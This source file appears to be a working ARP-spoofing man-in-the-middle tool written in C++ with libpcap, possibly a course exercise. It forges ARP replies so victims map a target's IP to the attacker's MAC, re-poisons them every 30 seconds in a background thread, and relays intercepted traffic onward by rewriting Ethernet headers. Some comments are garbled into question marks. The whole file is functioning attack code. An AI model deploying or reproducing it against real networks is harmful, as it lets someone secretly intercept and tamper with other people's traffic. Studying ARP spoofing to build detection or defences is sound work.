#include "arpattk.h"

void arp_request(pcap_t* handle, Ip sender_ip, Ip attacker_ip, Mac attacker_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(attacker_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void send_arp(pcap_t* handle, EthArpPacket packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	if (res2 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

uint32_t set_arp_packet2(EthArpPacket* packet, Ip sender_ip, Mac sender_mac, Ip target_ip, Ip attacker_ip, Mac attacker_mac){
	packet->eth_.dmac_ = sender_mac;
	packet->eth_.smac_ = attacker_mac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(ArpHdr::Reply);
	packet->arp_.smac_ = attacker_mac;
	packet->arp_.sip_ = htonl(target_ip);
	packet->arp_.tmac_ = sender_mac;
	packet->arp_.tip_ = htonl(sender_ip);

	return 1;
}
// ARP infect packet
void* arp_infect_thread(void* thread_argv){
	infect_argv* attack_data = (infect_argv*)thread_argv;
	EthArpPacket sender_reply_packet;
	uint32_t time_s = 30;
	while(true){
		printf("[+]ARP INFECT SEND! SET TIME: %ds\n", time_s);
		sleep(time_s);
		for(int i = 0; i < attack_data->size_; i++){
			set_arp_packet2(&sender_reply_packet, attack_data->arp_table_[i].sender_ip, attack_data->arp_table_[i].sender_mac, attack_data->arp_table_[i].target_ip, attack_data->arp_table_[i].attacker_ip, attack_data->arp_table_[i].attacker_mac);
			send_arp(attack_data->handle, sender_reply_packet);
			printf("[+]SEND TO ARP INFECT %s\n", ((std::string)attack_data->arp_table_[i].sender_ip).c_str());
		}
		printf("[+]ARP INFECT SEND ALL DONE!\n");
	}
}

void arp_spoof_flow(pcap_t* handle, pcap_pkthdr* pkt_header, const u_char* packet,  ArpTableThreadArgv* attack_data){
	EthArpPacket sender_reply_packet;
	set_arp_packet2(&sender_reply_packet, attack_data->sender_ip, attack_data->sender_mac, attack_data->target_ip, attack_data->attacker_ip, attack_data->attacker_mac);

	EthArpPacket* e_arp_packet = (EthArpPacket*)packet;
	if (e_arp_packet->eth_.type() == EthHdr::Arp){
		
		if(e_arp_packet->eth_.dmac().isBroadcast()){
			printf("[%s] SEND BROADCAST\n", ((std::string)attack_data->sender_ip).c_str());
			send_arp(handle, sender_reply_packet);
		}
		if(e_arp_packet->arp_.sip() == attack_data->sender_ip && e_arp_packet->arp_.tip() == attack_data->target_ip){
			printf("[%s] SEND ARP REQUEST1\n", ((std::string)attack_data->sender_ip).c_str());
			send_arp(handle, sender_reply_packet);
		}
		if(e_arp_packet->arp_.sip() == attack_data->sender_ip && e_arp_packet->arp_.tip() == attack_data->attacker_ip){
			printf("[%s] SEND ARP REQUEST2\n", ((std::string)attack_data->attacker_ip).c_str());
			send_arp(handle, sender_reply_packet);
		}

	} else { // arp ????????? ?????? ??????
		// arp ????????? ????????? mac ???????????? target?????? ??????
		EthHdr* ip_packet = (EthHdr*)packet;
		ip_packet->smac_ = attack_data->attacker_mac;
		ip_packet->dmac_ = attack_data->target_mac;
		
		int relay_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ip_packet), pkt_header->caplen);
		if (relay_res != 0) {
			fprintf(stderr, "[%s]pcap_sendpacket return %d error=%s\n", ((std::string)attack_data->sender_ip).c_str(), relay_res, pcap_geterr(handle));
		}
		printf("[%s] ONE FLOW DONE!\n",((std::string)attack_data->sender_ip).c_str());
	}
}